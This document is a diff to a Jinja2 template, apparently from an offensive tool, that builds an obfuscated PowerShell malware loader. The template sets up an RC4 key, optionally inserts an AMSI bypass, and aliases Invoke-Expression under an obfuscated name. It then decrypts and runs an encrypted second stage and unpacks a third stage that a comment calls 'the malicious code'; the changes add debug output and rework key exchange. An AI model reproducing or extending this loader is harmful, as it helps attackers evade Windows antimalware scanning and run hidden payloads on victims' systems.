@@ -7,15 +7,20 @@
     TODO: Include decoy code
 -#}
 
+{{'$DebugPreference = "Continue"'|debug}}
+{{'Write-Debug "Starting up..."'|debug}}
 {%- include "powershell/rc4.ps1" -%}
 
-{% if DH_G %}
+{{'Write-Debug "Key exchange..."'|debug}}
+{% if kex == 'dh' %}
 {%- include "powershell/dh_kex.ps1" %}
+{% elif kex == 'embedded' %}
+${{symbol_name("global_key")}} = [System.Text.Encoding]::UTF8.GetBytes("{{key}}");
 {% else %}
-${{symbol_name("KEY")}} = [System.Text.Encoding]::UTF8.GetBytes("{{key}}");
+${{symbol_name("global_key")}} = [System.Text.Encoding]::UTF8.GetBytes(${{symbol_name("global_key")}});
 {% endif %}
 
-function {{symbol_name("Decrypt-String")}} {[System.Text.Encoding]::UTF8.GetString(({{symbol_name("Decrypt-RC4")}} ([System.Convert]::FromBase64String($args[0])) ${{symbol_name("KEY")}}))};
+function {{symbol_name("Decrypt-String")}} {[System.Text.Encoding]::UTF8.GetString(({{symbol_name("Decrypt-RC4")}} ([System.Convert]::FromBase64String($args[0])) ${{symbol_name("global_key")}}))};
 
 
 {%- from 'macros.jinja2' import obfuscate with context -%}
@@ -25,16 +30,20 @@ function {{symbol_name("Decrypt-String")}} {[System.Text.Encoding]::UTF8.GetStri
     Next, load the specified AMSI bypass if one is given
 -#}
 
+{{'Write-Debug "Load AMSI Bypass..."'|debug}}
+
 {% if amsibypass %}{% include amsibypass %}{% endif %}
 
-{% if full -%}
-{#- Next, unless AMSI bypass and stage 3 are submitted separately, load stage 2 and then stage 3. Stage 2 defines helper functions such as `Unpack`. -#}
+{#- Next, load stage 2. Stage 2 defines helper functions such as `Unpack`. -#}
+
+{{'Write-Debug "Load 2nd stage..."'|debug}}
 
 s`Al {{symbol_name("Invoke-Expression")}} {{obfuscate("Invoke-Expression")}};
 {{symbol_name("Decrypt-String")}} "{{stage2}}" | {{symbol_name("Invoke-Expression")}};
 
 {# Finally, execute stage 3; i.e. the malicious code. -#}
+
 {%- for code in stage3 -%}
+{{'Write-Debug "Load 3rd stage..."'|debug}}
 {{symbol_name("Unpack")}} "{{code}}";
 {%- endfor -%}
-{%- endif -%}
